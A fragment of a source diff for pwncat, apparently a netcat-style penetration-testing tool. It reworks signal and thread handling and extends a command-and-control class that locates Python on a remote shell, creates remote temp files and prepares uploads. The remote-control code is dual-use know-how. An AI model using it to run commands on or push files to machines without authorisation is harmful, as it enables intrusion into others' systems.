+        except BrokenPipeError:
+            pass
 
     def interrupt(self):
         # type: () -> None
         """Stop function that can be called externally to close this instance."""
-        self.log.trace(  # type: ignore
-            "[IOCommand] subprocess.kill() was raised by input_unterrupter()"
-        )
-        self.proc.kill()
-        # Raise stop signal
-        # TODO: Check if this is required???
-        self.ssig.raise_stop()
+        self.log.trace("COMMAND-QUIT signal RAISED IOCommand.interrupt")  # type: ignore
+        self.ssig.raise_command_quit()
+        self.__cleanup()
+
+    def __cleanup(self):
+        # type: () -> None
+        """Cleanup function."""
+        if not self.__cleaned_up:
+            self.log.trace(  # type: ignore
+                "COMMAND-QUIT-CLEANUP: killing executable: %s with pid %d",
+                self.__opts.executable,
+                self.proc.pid,
+            )
+            self.proc.kill()
+            self.__cleaned_up = True
 
 
 # #################################################################################################
@@ -3316,18 +3690,18 @@ class PSEStore(object):
     The same instance of this class will be available to your send and receive scripts
     that allow you to exchange data or manipulate themselves. You even have access to the
     currently used instance of the networking class to manipulate the active socket.
-    As well as to the logger and StopSignal instances.
+    As well as to the logger and InterruptHandler instances.
     """
 
     @property
     def messages(self):
-        # type: () -> Dict[str, List[str]]
-        """`Dict[str, List[str]]`: Stores sent and received messages by its thread name."""
+        # type: () -> Dict[str, List[bytes]]
+        """`Dict[str, List[bytes]]`: Stores sent and received messages by its thread name."""
         return self.__messages
 
     @messages.setter
     def messages(self, value):
-        # type: (Dict[str, List[str]]) -> None
+        # type: (Dict[str, List[bytes]]) -> None
         self.__messages = value
 
     @property
@@ -3343,8 +3717,8 @@ class PSEStore(object):
 
     @property
     def ssig(self):
-        # type: () -> StopSignal
-        """`StopSignal`: Instance of Logging.logger class."""
+        # type: () -> InterruptHandler
+        """`InterruptHandler`: Instance of InterruptHandler class."""
         return self.__ssig
 
     @property
@@ -3360,11 +3734,11 @@ class PSEStore(object):
         return self.__log
 
     def __init__(self, ssig, net):
-        # type: (StopSignal, List[IONetwork]) -> None
+        # type: (InterruptHandler, List[IONetwork]) -> None
         """Instantiate the PSE class.
 
         Args:
-            ssig (StopSignal): Instance of the StopSignal class to force a shutdown.
+            ssig (InterruptHandler): Instance InterruptHandler.
             net (IONetwork): Instance of the current network class to manipulate the socket.
         """
         self.__messages = {}
@@ -3383,7 +3757,158 @@ class PSEStore(object):
 # #################################################################################################
 
 # -------------------------------------------------------------------------------------------------
-# [8/11 IO RUNNER]: (1/1) Runner
+# [8/11 IO RUNNER]: (1/2) InterruptHandler
+# -------------------------------------------------------------------------------------------------
+class InterruptHandler(object):
+    """Pwncat interrupt handler.
+
+    It allows all threads to raise various signal on certain actions,
+    as well as to ask the Interrupt Handler what to do.
+    The Interrupt handler will internally decide (based on pwncat's
+    command line arguments) what to do.
+    """
+
+    # --------------------------------------------------------------------------
+    # Constructor
+    # --------------------------------------------------------------------------
+    def __init__(self, keep_open, no_shutdown):
+        # type: (bool, bool) -> None
+        """Instantiate InterruptHandler.
+
+        Args:
+            keep_open (bool): `--keep-open` command line argument.
+            no_shutdown (bool): `--no-shutdown` command line argument.
+        """
+        self.__log = logging.getLogger(__name__)  # type: logging.Logger
+        self.__keep_open = keep_open
+        self.__no_shutdown = no_shutdown
+
+        # Shutdown signals
+        self.__terminate = False
+        self.__sock_send_eof = False
+        self.__sock_quit = False
+        self.__stdin_quit = False
+        self.__command_quit = False
+
+        # Producers have received EOF
+        self.__sock_eof = False
+        self.__stdin_eof = False
+        self.__command_eof = False
+
+        def handler(signum, frame):  # type: ignore  # pylint: disable=unused-argument
+            self.__log.trace("Ctrl+c caught.")  # type: ignore
+            # logging.shutdown()
+            self.raise_terminate()
+
+        # Handle Ctrl+C
+        # signal.signal(signal.SIGTERM, handler)
+        signal.signal(signal.SIGINT, handler)
+
+    # --------------------------------------------------------------------------
+    # Ask for action
+    # --------------------------------------------------------------------------
+    def has_terminate(self):
+        # type: () -> bool
+        """`bool`: Switch to be checked if pwncat should be terminated."""
+        return self.__terminate
+
+    def has_sock_send_eof(self):
+        # type: () -> bool
+        """`bool`: Switch to be checked if the socket connection should be closed for sending."""
+        return self.__sock_send_eof
+
+    def has_sock_quit(self):
+        # type: () -> bool
+        """`bool`: Switch to be checked if the socket connection should be closed."""
+        return self.__sock_quit
+
+    def has_stdin_quit(self):
+        # type: () -> bool
+        """`bool`: Switch to be checked if the STDIN should be closed."""
+        return self.__stdin_quit
+
+    def has_command_quit(self):
+        # type: () -> bool
+        """`bool`: Switch to be checked if the command should be closed."""
+        return self.__command_quit
+
+    # --------------------------------------------------------------------------
+    # Raise Termination signal
+    # --------------------------------------------------------------------------
+    def raise_terminate(self):
+        # type: () -> None
+        """Signal the application that Socket should be quit."""
+        self.__log.trace("SIGNAL TERMINATE raised")  # type: ignore
+        self.__terminate = True
+        self.__sock_quit = True
+        self.__stdin_quit = True
+        self.__command_quit = True
+
+    # --------------------------------------------------------------------------
+    # Raise Socket signals
+    # --------------------------------------------------------------------------
+    def raise_sock_send_eof(self):
+        # type: () -> None
+        """Signal the application that Socket should be closed for sending."""
+        # self.__log.trace("SIGNAL SOCK-CLOSE-SEND raised")  # type: ignore
+        self.__sock_send_eof = True
+
+    def raise_sock_eof(self):
+        # type: () -> None
+        """Signal the application that Socket has received EOF."""
+        # self.__log.trace("SIGNAL SOCK-EOF raised")  # type: ignore
+        self.__sock_eof = True
+        self.raise_sock_quit()
+
+    def raise_sock_quit(self):
+        # type: () -> None
+        """Signal the application that Socket should be quit."""
+        # self.__log.trace("SIGNAL SOCK-QUIT raised")  # type: ignore
+        self.__sock_quit = True
+        self.raise_terminate()
+
+    # --------------------------------------------------------------------------
+    # Raise STDIN signals
+    # --------------------------------------------------------------------------
+    def raise_stdin_eof(self):
+        # type: () -> None
+        """Signal the application that STDIN has received EOF."""
+        # self.__log.trace("SIGNAL STDIN-EOF raised")  # type: ignore
+        self.__stdin_eof = True
+        self.raise_stdin_quit()
+
+    def raise_stdin_quit(self):
+        # type: () -> None
+        """Signal the application that STDIN should be quit."""
+        # self.__log.trace("SIGNAL STDIN-QUIT raised")  # type: ignore
+        self.__stdin_quit = True
+        # If --no-shutdown or -keep-open is specified
+        # pwncat will not invoke shutdown on a socket after seeing EOF on stdin
+        if not (self.__no_shutdown or self.__keep_open):
+            # No more data from stdin, we can tell the remote side we are done
+            # by closing the socket for sending (they will receive an EOF).
+            self.raise_sock_send_eof()
+
+    # --------------------------------------------------------------------------
+    # Raise COMMAND signals
+    # --------------------------------------------------------------------------
+    def raise_command_eof(self):
+        # type: () -> None
+        """Signal the application that Command has received EOF."""
+        # self.__log.trace("SIGNAL COMMAND-EOF raised")  # type: ignore
+        self.__command_eof = True
+        self.raise_command_quit()
+
+    def raise_command_quit(self):
+        # type: () -> None
+        """Signal the application that Command should be quit."""
+        # self.__log.trace("SIGNAL COMMAND-QUIT raised")  # type: ignore
+        self.__command_quit = True
+        self.raise_terminate()
+
+
+# -------------------------------------------------------------------------------------------------
+# [8/11 IO RUNNER]: (2/2) Runner
 # -------------------------------------------------------------------------------------------------
 class Runner(object):
     """Runner class that takes care about putting everything into threads."""
@@ -3391,11 +3916,13 @@ class Runner(object):
     # --------------------------------------------------------------------------
     # Constructor / Destructor
     # --------------------------------------------------------------------------
-    def __init__(self, pse):
-        # type: (PSEStore) -> None
+    def __init__(self, ssig, fast_quit, pse):
+        # type: (InterruptHandler, bool, PSEStore) -> None
         """Create a new Runner object.
 
         Args:
+            ssig (InterruptHandler): Instance of InterruptHandler.
+            fast_quit (boo): On `True` do not join threads upon exit, just raise terminate and exit.
             pse (PSEStore): Pwncat Scripting Engine store.
         """
         self.log = logging.getLogger(__name__)
@@ -3417,6 +3944,8 @@ class Runner(object):
         # {"name": "<thread>"}
         self.__threads = {}  # type: Dict[str, threading.Thread]
 
+        self.__ssig = ssig
+        self.__fast_quit = fast_quit
         self.__pse = pse
 
     # --------------------------------------------------------------------------
@@ -3459,7 +3988,7 @@ class Runner(object):
         def run_action(
             name,  # type: str
             producer,  # type: DsCallableProducer
-            consumer,  # type: Callable[[str], None]
+            consumer,  # type: Callable[[bytes], None]
             transformers,  # type: List[Transform]
             code,  # type: Optional[Union[str, bytes, CodeType]]
         ):
@@ -3508,23 +4037,25 @@ class Runner(object):
                 consumer(data)
             self.log.trace("[%s] Producer Stop", name)  # type: ignore
 
-        def run_timer(name, action, intvl, ssig, args, **kwargs):
-            # type: (str, Callable[..., None], int, StopSignal, Any, Any) -> None
+        def run_timer(name, action, intvl, ssig, *args, **kwargs):
+            # type: (str, Callable[..., None], int, InterruptHandler, Any, Any) -> None
             """Timer run function to be thrown into a thread (Execs periodic tasks).
 
             Args:
                 name (str):        Name for logging output
                 action (function): Function to be called in a given intervall
                 intvl (float):     Intervall at which the action function will be called
-                ssig (StopSignal): Providing has_stop() and raise_stop()
+                ssig (InterruptHandler): Instance of InterruptHandler
                 args (*args):      *args for action func
                 kwargs (**kwargs): **kwargs for action func
             """
             self.log.trace("[%s] Timer Start (exec every %f sec)", name, intvl)  # type: ignore
             time_last = int(time.time())
             while True:
-                if ssig.has_stop():
-                    self.log.trace("Stop signal acknowledged for timer %s", name)  # type: ignore
+                if ssig.has_terminate():
+                    self.log.trace(  # type: ignore
+                        "TERMINATE signal ACK for timer action [%s]", name
+                    )
                     return
                 time_now = int(time.time())
                 if time_now > time_last + intvl:
@@ -3533,8 +4064,8 @@ class Runner(object):
                     time_last = time_now  # Reset previous time
                 time.sleep(0.1)
 
-        def run_repeater(name, action, repeat, pause, ssig, args, **kwargs):
-            # type: (str, Callable[..., None], int, float, StopSignal, Any, Any) -> None
+        def run_repeater(name, action, repeat, pause, ssig, *args, **kwargs):
+            # type: (str, Callable[..., None], int, float, InterruptHandler, Any, Any) -> None
             """Repeater run function to be thrown into a thread (Execs periodic tasks).
 
             Args:
@@ -3542,23 +4073,30 @@ class Runner(object):
                 action (function): Function to be called
                 repeat (int):      Repeat the function so many times before quitting
                 pause (float):     Pause between repeated calls
-                ssig (StopSignal): Providing has_stop() and raise_stop()
+                ssig (InterruptHandler): Instance of InterruptHandler
                 args (*args):      *args for action func
                 kwargs (**kwargs): **kwargs for action func
             """
             cycles = 1
             self.log.trace("Repeater Start (%d/%d)", cycles, repeat)  # type: ignore
             while cycles <= repeat:
-                if ssig.has_stop():
-                    self.log.trace("Stop signal acknowledged for timer %s", name)  # type: ignore
+                if ssig.has_terminate():
+                    self.log.trace(  # type: ignore
+                        "TERMINATE signal ACK for repeater action [%s]", name
+                    )
                     return
                 self.log.debug("Executing repeated function (%d/%d)", cycles, repeat)
                 action(*args, **kwargs)
                 cycles += 1
                 time.sleep(pause)
 
-        # Start available action in a thread
+        # [1/3] Start available action in a thread
         for key in self.__actions:
+            if self.__ssig.has_terminate():
+                self.log.trace(  # type: ignore
+                    "TERMINATE signal ACK for Runner.run [1]: [%s]", key
+                )
+                break
             # Create Thread object
             thread = threading.Thread(
                 target=run_action,
@@ -3571,17 +4109,35 @@ class Runner(object):
                     self.__actions[key].code,
                 ),
             )
-            thread.daemon = False
+            # Daemon threads are easier to kill
+            thread.daemon = self.__actions[key].daemon_thread
+
             # Add delay if threads cannot be started
+            delay = 0.0
             while True:
+                if self.__ssig.has_terminate():
+                    self.log.trace(  # type: ignore
+                        "TERMINATE signal ACK for Runner.run [2]: [%s]", key
+                    )
+                    break
                 try:
+                    # Do not call any logging functions in here as it will
+                    # cause a deadlock for Python2
+                    # Start and break the loop upon success to go to the next thread to start
                     thread.start()
                     break
                 except (RuntimeError, Exception):  # pylint: disable=broad-except
-                    time.sleep(0.1)
+                    delay += 0.1
+                    time.sleep(delay)  # Give the system some time to release open fd's
             self.__threads[key] = thread
-        # Start available timers in a thread
+
+        # [2/3] Start available timers in a thread
         for key in self.__timers:
+            if self.__ssig.has_terminate():
+                self.log.trace(  # type: ignore
+                    "TERMINATE signal ACK for Runner.run [2]: [%s]", key
+                )
+                break
             # Create Thread object
             thread = threading.Thread(
                 target=run_timer,
@@ -3590,15 +4146,21 @@ class Runner(object):
                     key,
                     self.__timers[key].action,
                     self.__timers[key].intvl,
-                    self.__timers[key].signal,
-                    self.__timers[key].args,
-                ),
+                    self.__timers[key].ssig,
+                )
+                + self.__timers[key].args,
                 kwargs=self.__timers[key].kwargs,
             )
             thread.daemon = False
             thread.start()
-        # Start available repeaters in a thread
+
+        # [3/3] Start available repeaters in a thread
         for key in self.__repeaters:
+            if self.__ssig.has_terminate():
+                self.log.trace(  # type: ignore
+                    "TERMINATE signal ACK for Runner.run [3]: [%s]", key
+                )
+                break
             # Create Thread object
             thread = threading.Thread(
                 target=run_repeater,
@@ -3608,56 +4170,72 @@ class Runner(object):
                     self.__repeaters[key].action,
                     self.__repeaters[key].repeat,
                     self.__repeaters[key].pause,
-                    self.__repeaters[key].signal,
-                    self.__repeaters[key].args,
-                ),
+                    self.__repeaters[key].ssig,
+                )
+                + self.__repeaters[key].args,
                 kwargs=self.__repeaters[key].kwargs,
             )
             thread.daemon = False
             thread.start()
 
-        def check_stop(force):
-            # type: (int) -> bool
+        def check_stop():
+            # type: () -> bool
             """Stop threads."""
-            for key in self.__threads:
-                if not self.__threads[key].is_alive() or force:
-                    # TODO: How are we gonna call the stop signal now?
-                    #  # [1/3] Inform all threads (inside) about a stop signal.
-                    #  # All threads with non-blocking funcs will be able to stop themselves
-                    #  self.log.trace(  # type: ignore
-                    #      "Raise stop signal: StopSignal.stop() for thread [%s]",
-                    #      self.__threads[key].getName(),
-                    #  )
-                    #  self.__actions[key].signal.raise_stop()
-                    # [2/3] Call external interrupters
-                    # These will shutdown all blocking functions inside a thread,
-                    # so that they are actually able to join
-                    for interrupt in self.__actions[key].interrupts:
-                        self.log.trace(  # type: ignore
-                            "Call INTERRUPT: %s.%s() for %s",
-                            getattr(interrupt, "__self__").__class__.__name__,
-                            interrupt.__name__,
-                            self.__threads[key].getName(),
-                        )
-                        interrupt()
-                    # [3/3] All blocking events inside the threads are gone, now join them
-                    self.log.trace("Joining %s", self.__threads[key].getName())  # type: ignore
-                    self.__threads[key].join(timeout=0.1)
-            # If all threads have died or force is requested, then exit
-            if not all([self.__threads[key].is_alive() for key in self.__threads]) or force:
+            # [1/2] Fast shutdown
+            # For Python < 3.3 we are unable to detect Ctrl+c signal during thread.join()
+            # in a fast loop. Also for port-scan we will have thousands of threads that need
+            # to be joined and the signal handler is unable to abort the whole program during that
+            # time. Outcome is it would take a few minutes to abort during port scan.
+            # The fix is to use a "faster" method to kill the threads.
+            # 1. The port scanner threads need to be started in daemon mode
+            # 2. the fast_quit param to Runner() must be set to True
+            if self.__fast_quit:
+                if self.__ssig.has_terminate():
+                    self.log.trace("Fast quit - shutting down.")  # type: ignore
+                    return True
+
+            # [2/2] Normal shutdown for non-daemon threads
+            else:
+                for key in self.__threads:
+                    if not self.__threads[key].is_alive() or self.__ssig.has_terminate():
+                        for interrupt in self.__actions[key].interrupts:
+                            # [1/3] Call external interrupters
+                            self.log.trace(  # type: ignore
+                                "Call INTERRUPT: %s.%s() for %s",
+                                getattr(interrupt, "__self__").__class__.__name__,
+                                interrupt.__name__,
+                                self.__threads[key].getName(),
+                            )
+                            interrupt()
+                            # [2/3] All blocking events inside the threads are gone, now join them
+                            try:
+                                self.log.trace(  # type: ignore
+                                    "Joining %s", self.__threads[key].getName()
+                                )
+                                # NOTE: The thread.join() operating will also block the signal
+                                # handler if we try to join too many threads at once.
+                                self.__threads[key].join()
+                                self.log.trace(  # type: ignore
+                                    "Joined %s", self.__threads[key].getName()
+                                )
+                            except RuntimeError:
+                                pass
+            # If all threads are done, also stop
+            if all([not self.__threads[key].is_alive() for key in self.__threads]):
+                self.log.trace("All threads dead - shutting down.")  # type: ignore
                 return True
             return False
 
-        try:
-            while True:
-                if check_stop(False):
-                    sys.exit(0)
-                # Need a timeout to not skyrocket the CPU
-                time.sleep(0.1)
-        except KeyboardInterrupt:
-            print()
-            check_stop(True)
-            sys.exit(1)
+        while True:
+            if check_stop():
+                sys.exit(0)
+            # Need a timeout to not skyrocket the CPU
+            if sys.version_info < (3, 3):
+                # Signal Handler in Python < 3.3 is broken and might not catch on
+                # a too small timeout invervall
+                time.sleep(0.5)
+            else:
+                time.sleep(0.01)
 
 
 # #################################################################################################
@@ -3669,13 +4247,19 @@ class Runner(object):
 # #################################################################################################
 
 # -------------------------------------------------------------------------------------------------
-# [9/11 Command & Control]: (1/2) CNC
+# [9/11 Command & Control]: (1/3) CNC Exception classes
+# -------------------------------------------------------------------------------------------------
+class CNCPythonNotFound(BaseException):
+    """CNC Exception handler."""
+
+
+# -------------------------------------------------------------------------------------------------
+# [9/11 Command & Control]: (2/3) CNC
 # -------------------------------------------------------------------------------------------------
 class CNC(object):
     """Command and Control base class."""
 
     __PYTHON_PATHS = [
-        "/bin",
         "/usr/bin",
         "/usr/local/bin",
         "/usr/local/python/bin",
@@ -3686,6 +4270,7 @@ class CNC(object):
         "/usr/local/python3.6/bin",
         "/usr/local/python3.7/bin",
         "/usr/local/python3.8/bin",
+        "/bin",
         "/opt/bin",
         "/opt/python/bin",
         "/opt/python2/bin",
@@ -3697,11 +4282,11 @@ class CNC(object):
         "/opt/python3.8/bin",
     ]
 
-    __PYTHON_VERSIONS = [
+    __PYTHON_NAMES = [
+        "python3",
         "python",
         "python2",
         "python2.7",
-        "python3",
         "python3.5",
         "python3.6",
         "python3.7",
@@ -3714,42 +4299,61 @@ class CNC(object):
     # Properties
     # --------------------------------------------------------------------------
     @property
-    def python(self):
+    def remote_python(self):
         # type: () -> str
         """Discovered absolute Python remote path."""
-        return self.__python
+        return self.__remote_python
 
     @property
-    def py3(self):
+    def remote_py3(self):
         # type: () -> bool
         """Is remote version Python3? Else it is Python2."""
-        return self.__py3
+        return self.__remote_py3
 
     # --------------------------------------------------------------------------
     # Constructor
     # --------------------------------------------------------------------------
-    def __init__(self, enc, fsend, frecv):
-        # type: (StringEncoder, Callable[[str], None], Callable[[], Iterator[str]]) -> None
+    def __init__(self, network):
+        # type: (IONetwork) -> None
         """Instantiate Command and Control class.
 
         Args:
-            enc (StringEncoder): Instance of StringEncoder (Python2/3 str/byte compat).
-            fsend (func): Socket send function.
-            frcev (func): Socket receive generator function.
+            network (IONetwork): Instance of IONetwork
 
         Raises:
-            FileNotFoundError: if remote Python binary path is not found.
+            CNCPythonNotFound: if remote Python binary path is not found.
         """
-        self.__enc = enc
-        self.__fsend = fsend
-        self.__frecv = frecv
+        self.__net = network
+        self.__log = logging.getLogger(__name__)
+        self.__py3 = sys.version_info >= (3, 0)  # type: bool
 
+        # Along with the response the server might prefix/suffix data
+        # such as a PS1 prompt (which might be send first or last with a newline)
+        self.__remote_prefix = []  # type: List[bytes]
+        self.__remote_suffix = []  # type: List[bytes]
+
+        # Receive timeout value will be adjusted dynamically depending on the
+        # speed of the server. We'll start high to allow for slow servers.
+        self.__recv_timeout = 0.3
+        self.__recv_rounds = 5
+        self.__recv_times = []  # type: List[float]
+
+        # [1/3] Check if there is data to be received first (e.g.: greeting)
+        self.print_info("Checking if remote sends greeting...")
+        greeting = self.send_recv(None, False, False)
+        if greeting:
+            self.print_raw(b"\n".join(greeting), True)
+
+        # [2/3] Check if the remote sends a prefix with every reply
+        self.__set_remote_prefix()
+
+        # [3/3] Find potential Python versions
         if not self.__set_remote_python_path():
             self.print_info("No Python has been found. Aborting and handing over to current shell.")
-            raise FileNotFoundError()
+            raise CNCPythonNotFound()
 
     # --------------------------------------------------------------------------
-    # Public Functions
+    # Print Functions
     # --------------------------------------------------------------------------
     def print_info(self, message=None, newline=True, erase=False):
         # type: (Optional[str], bool, bool) -> None
@@ -3773,15 +4377,261 @@ class CNC(object):
             print("{}{}".format(prefix, message), end=end)
             sys.stdout.flush()
 
-    def remote_command(self, command):
-        # type: (str) -> None
-        """Run remote command with correct linefeeds.
+    def print_raw(self, message, newline):
+        # type: (bytes, bool) -> None
+        """Print a message to the local screen without color/prefix.
+
+        Args:
+            message (bytes): The message to print.
+            newline (bool): Add a newline?
+        """
+        if self.__py3:
+            end = b"\n" if newline else b""
+            sys.stdout.buffer.write(b"".join([message, end]))
+        else:
+            end = "\n" if newline else ""  # type: ignore
+            print(message, end=end)  # type: ignore
+
+        # For issues with flush (when using tail -F or equal) see links below:
+        # https://stackoverflow.com/questions/26692284
+        # https://docs.python.org/3/library/signal.html#note-on-sigpipe
+        try:
+            sys.stdout.flush()
+        except IOError:
+            # Python flushes standard streams on exit; redirect remaining output
+            # to devnull to avoid another broken pipe at shutdown
+            devnull = os.open(os.devnull, os.O_WRONLY)
+            os.dup2(devnull, sys.stdout.fileno())
+
+    # --------------------------------------------------------------------------
+    # Network Functions
+    # --------------------------------------------------------------------------
+    def send(self, data):
+        # type: (bytes) -> int
+        """Send data through a connected (TCP) or unconnected (UDP) socket.
+
+        Args:
+            data (bytes): The data to send.
+
+        Returns:
+            int: Returns total bytes sent.
+
+        Raises:
+            socket.error:   Except here when unconnected or connection was forcibly closed.
+        """
+        return self.__net.net.send(data)
+
+    def flush_receive(self):
+        # type: () -> List[bytes]
+        """Try to reveive everything which is currently being sent from remote.
+
+        Returns:
+            List[bytes]: Returns a list of bytes of received data.
+
+        Raises:
+            socket.error:   Except here when unconnected or connection was forcibly closed.
+        """
+        self.print_info("Flushing receive buffer (this can take some time) ...")
+
+        self.send(b"\n")
+        data1 = self.send_recv(None, False, False)
+        data2 = self.send_recv(None, False, False)
+
+        self.print_info("Flushing receive buffer done.")
+        return data1 + data2
+
+    def send_recv(self, data, strip_suffix=True, strip_echo=False):
+        # type: (Optional[bytes], bool, bool) -> List[bytes]
+        """Send data through a connected (TCP) or unconnected (UDP) socket and receive all replies.
+
+        Args:
+            data (None|bytes): The data to send. If None, will skip sending.
+            strip_suffix (bool): Strip remote suffix from received data?
+            strip_echo (bool): Also remove 'data' from output if server has echo'ed it?
+
+        Returns:
+            List[bytes]: Returns a list of bytes of received data.
+
+        Raises:
+            socket.error:   Except here when unconnected or connection was forcibly closed.
+        """
+        # [1/4] Send
+        if data is not None:
+            self.__net.net.send(data)
+
+        # [2/4] Receive actual reply
+        responses = []
+
+        # Setup timer and current receive round
+        time_start = datetime.now()
+        curr_round = 0
+
+        while curr_round < self.__recv_rounds:
+            try:
+                response = self.__net.net.receive()
+            except socket.timeout:
+                time.sleep(self.__recv_timeout)
+                time_step = datetime.now()
+                time_diff = time_step - time_start
+
+                self.__log.trace(  # type: ignore
+                    "Timeout: Receive timed out after %f sec in %d/%d rounds",
+                    time_diff.total_seconds(),
+                    curr_round + 1,
+                    self.__recv_rounds,
+                )
+                curr_round += 1
+            # On successful read, we can determine to adjust timings.
+            else:
+                time_end = datetime.now()
+                time_diff = time_end - time_start
+
+                self.__recv_times.append(time_diff.total_seconds())
+                self.__log.trace(  # type: ignore
+                    "Timeout: Receive took %f sec (avg: %f) to receive in %d/%d rounds",
+                    time_diff.total_seconds(),
+                    sum(self.__recv_times) / len(self.__recv_times),
+                    curr_round + 1,
+                    self.__recv_rounds,
+                )
+
+                # Retries were required
+                prev_recv_timeout = self.__recv_timeout
+                if curr_round > 1:
+                    self.__recv_timeout += time_diff.total_seconds()
+                # No retries requred
+                else:
+                    self.__recv_timeout = time_diff.total_seconds() / 2
+
+                self.__log.trace(  # type: ignore
+                    "Timeout: Previous recv timeout: %f sec -> new recv timeout: %f sec",
+                    prev_recv_timeout,
+                    self.__recv_timeout,
+                )
+
+                # Add response
+                if response:
+                    responses.append(response)
+
+                # Reset the start time and round
+                time_start = datetime.now()
+                curr_round = 0
+
+        # Return if already empty
+        if not responses:
+            return responses
+
+        # Response could be in one of the below listed formats:
+        # 1. response could be one line per element
+        # 2. reposnse could be multiple lines per element
+        # 3. response cloud be single characters per element
+        # But we want to make sure that we always get one line per element,
+        # so we normalize it
+
+        # First: Join lines which do not have line endings
+        self.__log.debug("Normalize recv before (1): %s", repr(responses))
+        normalized = []
+        has_eol = True
+        for line in responses:
+            if has_eol:
+                normalized.append(line)
+            else:
+                normalized[-1] = normalized[-1] + line
+            # Determine what to do next iteration
+            if line.endswith(b"\r\n"):
+                has_eol = True
+            elif line.endswith(b"\n"):
+                has_eol = True
+            elif line.endswith(b"\r"):
+                has_eol = True
+            else:
+                has_eol = False
+        responses = normalized
+        self.__log.debug("Normalize recv after  (1): %s", repr(responses))
+
+        # Second: Separate lines which have line endings
+        self.__log.debug("Normalize recv before (2): %s", repr(responses))
+        normalized = []
+        for line in responses:
+            line = line.rstrip(b"\r\n")
+            line = line.rstrip(b"\n")
+            line = line.rstrip(b"\r")
+            line = line.lstrip(b"\r\n")
+            line = line.lstrip(b"\n")
+            line = line.lstrip(b"\r")
+            if b"\r\n" in line:
+                for newline in line.split(b"\r\n"):
+                    normalized.append(newline)
+            elif b"\n" in line:
+                for newline in line.split(b"\n"):
+                    normalized.append(newline)
+            elif b"\r" in line:
+                for newline in line.split(b"\r"):
+                    normalized.append(newline)
+            else:
+                normalized.append(line)
+        responses = normalized
+        self.__log.debug("Normalize recv after  (2): %s", repr(responses))
+
+        # [3/4] Remove remote ends suffix (if it sends something like it)
+        # We iterate reversed of responses and check if the new line suffix(es)
+        # are present at the end.
+        # This is because the suffix(es) is always received last.
+        if self.__remote_suffix and strip_suffix:
+            # If multiple suffix lines are send we will first strip x-1 suffix lines
+            if len(self.__remote_suffix) > 1:
+                lines_to_strip = len(self.__remote_suffix) - 1
+                self.__log.debug("Remove suffix before (1): %s", repr(responses))
+                responses = responses[:-lines_to_strip]
+                self.__log.debug("Remove suffix after  (1): %s", repr(responses))
+
+            # Return if already empty
+            if not responses:
+                return responses
+
+            # Clean up the last response line with first suffix line
+            self.__log.debug("Remove suffix before (2): %s", repr(responses))
+            responses[-1] = responses[-1].rstrip(self.__remote_suffix[0])
+            self.__log.debug("Remove suffix after  (2): %s", repr(responses))
+
+            # Ensure empty elements are removed
+            self.__log.debug("Remove suffix before (3): %s", repr(responses))
+            responses = [item for item in responses if item]
+            self.__log.debug("Remove suffix after  (3): %s", repr(responses))
+
+        # [4/4] Some server also echo back what we've send, so if we did send something
+        # we need to strip this off as well
+        if data is not None and strip_echo:
+            for idx, item in enumerate(responses):
+                if data in responses[idx]:
+                    del responses[idx]
+                elif data.rstrip() in responses[idx]:
+                    del responses[idx]
+                # Ensure empty elements are removed
+                responses = [item for item in responses if item]
+
+        # Return list of respones
+        return responses
+
+    # --------------------------------------------------------------------------
+    # High-level Functions
+    # --------------------------------------------------------------------------
+    def remote_command(self, command, output):
+        # type: (str, bool) -> Optional[List[bytes]]
+        """Run remote command with correct linefeeds and receive response lines.
 
         Args:
             command (str): The command to execute on the remote end.
+            output (bool): Receive output from command?
         """
-        # TODO: determine remote host line feeds and set accordingly.
-        self.__fsend(command + "\n")
+        command = command.rstrip("\r\n")
+        command = command.rstrip("\r")
+        command = command.rstrip("\n")
+        command = command + "\n"
+        if output:
+            return self.send_recv(StringEncoder.encode(command), True, True)
+        self.send(StringEncoder.encode(command))
+        return None
 
     def create_remote_tmpfile(self):
         # type: () -> Optional[str]
@@ -3790,26 +4640,73 @@ class CNC(object):
         Returns:
             str or None: Returns path on success or None on error.
         """
+        self.flush_receive()
+        self.print_info("Creating tmpfile:", False, True)
+
         command = []
-        command.append("{} -c '".format(self.__python))
+        command.append("{} -c '".format(self.__remote_python))
         command.append("import tempfile;")
         command.append("h,f=tempfile.mkstemp();")
-        if self.__py3:
+        if self.__remote_py3:
             command.append("print(f);")
         else:
             command.append("print f;")
         command.append("'")
-        self.remote_command("".join(command))
+        response = self.remote_command("".join(command), True)
 
-        self.print_info("Creating tmpfile:", False, True)
-        for response in self.__frecv():
-            if response:
-                tmpfile = response.rstrip()
-                self.print_info("Creating tmpfile: {}".format(tmpfile), True, True)
-                return tmpfile
+        # All good
+        if response is not None and len(response) == 1:
+            tmpfile = StringEncoder.decode(response[0]).rstrip()
+            self.print_info("Creating tmpfile: {}".format(repr(tmpfile)), True, True)
+            return tmpfile
 
-        self.print_info("Failed to create tmpfile", True, True)
+        # Something went wrong with stripping prefix from server, we need to manually
+        # check if creation was successful.
+        if response is not None and len(response) > 1:
+            # A bit fuzzy, but we try a few times
+            for _ in range(5):
+                self.print_info("Creating tmpfile: Unsure - checking otherwise", True, True)
+                for candidate in response:
+                    tmpfile = StringEncoder.decode(candidate).rstrip()
+                    if self.remote_file_exists(tmpfile):
+                        self.print_info("Creating tmpfile: {}".format(repr(tmpfile)), True, True)
+                        return tmpfile
+
+        self.print_info("Creating tmpfile: Failed", True, True)
+        self.print_info("Response: {}".format(repr(response)))
         return None
+
+    def remote_file_exists(self, remote_path):
+        # type: (str) -> bool
+        """Ensure given remote path exists as a file on remote end.
+
+        Args:
+            remote_path (str): Path of file to check.
+
+        Returns:
+            bool: Returns `True` on success and `False` on failure.
+        """
+        self.flush_receive()
+
+        # String should be short as an unstable remote might send small chunks
+        unique_string = "_pwncat_"
+        response = self.remote_command(
+            'test -f "{}" && echo "{}"'.format(remote_path, unique_string), True
+        )
+        if response is not None:
+            for candidate in response:
+                if StringEncoder.decode(candidate) == unique_string:
+                    return True
+                if StringEncoder.decode(candidate).rstrip() == unique_string:
+                    return True
+        response = self.flush_receive()
+        if response is not None:
+            for candidate in response:
+                if StringEncoder.decode(candidate).rstrip() == unique_string:
+                    return True
+                if StringEncoder.decode(candidate).rstrip() == unique_string:
+                    return True
+        return False
 
     def upload(self, lpath, rpath):
         # type: (str, str) -> bool
@@ -3822,13 +4719,14 @@ class CNC(object):
         Returns:
             bool: Returns `True` on success and `False` on failure.
         """
-        assert self.__python is not None
-        assert self.__py3 is not None
+        assert self.__remote_python is not None
+        assert self.__remote_py3 is not None
 
         rpath_b64 = self.create_remote_tmpfile()
+        self.flush_receive()
         if rpath_b64 is None:
             return False
